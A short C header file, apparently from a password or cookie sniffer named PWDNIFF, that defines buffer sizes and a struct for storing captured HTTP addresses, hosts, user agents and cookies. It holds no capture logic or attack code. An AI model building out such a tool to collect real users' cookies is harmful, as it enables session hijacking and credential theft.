#ifndef _PWDNIFF_H_
#define _PWDNIFF_H_

#define ADDR_LEN			1024
#define USERAGENT_LEN		256
#define HOST_LEN			128
#define COOKIE_LEN			1024
#define HEADER_RECORD_NUM	(1024 * 64)

struct http_header
{
	char	addr[ADDR_LEN];
	char	host[HOST_LEN];
	char	useragent[USERAGENT_LEN];
	char	cookie[COOKIE_LEN];
	
	ushort	addr_len;
	ushort	host_len;
	ushort	useragent_len;
	ushort	cookie_len;
};

#endif